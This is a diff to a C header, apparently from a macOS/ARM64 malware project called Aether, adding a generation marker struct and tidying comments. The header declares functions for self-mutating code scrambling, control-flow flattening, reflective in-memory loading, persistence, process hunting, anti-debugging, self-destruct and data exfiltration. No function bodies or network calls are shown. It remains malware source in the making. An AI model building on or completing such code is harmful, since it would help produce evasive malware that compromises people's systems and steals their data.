@@ -85,6 +85,9 @@
 #define ALIGN_PAGE(x) (((x) + PAGE_SIZE_64 - 1) & ~(PAGE_SIZE_64 - 1))
 #define ALIGN_8(x) (((x) + 7) & ~7)
 
+#define MX_GEN 4 
+static const uint8_t MORPH_MAGIC[8] = {'A', 'E', 'T', 'H', 'R', 0, 0, 0};
+
 /* DEBUG=1 (FOO flag) */
 #ifdef FOO
 #define DBG(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
@@ -104,6 +107,12 @@
 #else
     #define CURRENT_ARCH ARCH_X86  
 #endif
+
+typedef struct __attribute__((packed)) {
+    uint8_t magic[8];
+    uint32_t generation;
+    uint32_t checksum;
+} marker_t;  
 
 /* liveness tracking */
 typedef struct {
@@ -445,8 +454,6 @@ typedef struct {
     uint8_t *backup;
 } tramp_backup_t;
 
-
-
 /* Semantic */
 typedef struct {
     sem_type_t sem_type;
@@ -732,46 +739,46 @@ void scramble_arm64(uint8_t *code, size_t size, chacha_state_t *rng, unsigned ge
                     muttt_t *log, liveness_state_t *liveness, unsigned mutation_intensity);
 #endif
 
-// Control flow
+/* Control flow */
 void flatline_flow(uint8_t *code, size_t size, flowmap *fm, chacha_state_t *rng);
 void shuffle_blocks(uint8_t *code, size_t size, void *rng);
 
-// Validation
+/* Validation */
 bool is_chunk_ok(const uint8_t *chunk, size_t max_len);
 bool is_op_ok(const uint8_t *op);
 size_t snap_len(const uint8_t *buf, size_t maxlen);
 
-// Mach-O 
+/* Mach-O */
 uint8_t* wrap_macho(const uint8_t *code, size_t code_size, size_t *out_size);  
 bool V_machO(const uint8_t *data, size_t size);
 
-// Reflective loading
+/* Reflective loading */
 bool exec_mem(uint8_t *data, size_t size);
 image_t* load_image(uint8_t *data, size_t size);  
 
-// Persistence
+/* Persistence */
 int persist(void);
 
-// Hunting 
+/* Hunting */
 void hunt_procs(void);
 void Spawn(void);
 
-// Self-mutation
+/* Self-mutation */
 int mutator(void);
 
-// Self-destruct
+/* Self-destruct */
 void k_ill(void) __attribute__((noreturn));
 void panic(void) __attribute__((noreturn));
 
-// Vault
+/* Vault */
 void Init_str(void);
 void Clean_str(void); 
 
-// Exfiltration
+/* Exfiltration */
 int sendProfile(void);
 void mint_uuid(char *id);
 
-// Anti-debug
+/* Anti-debug */
 int scan(void);
 
 #endif /* AETHER_H */
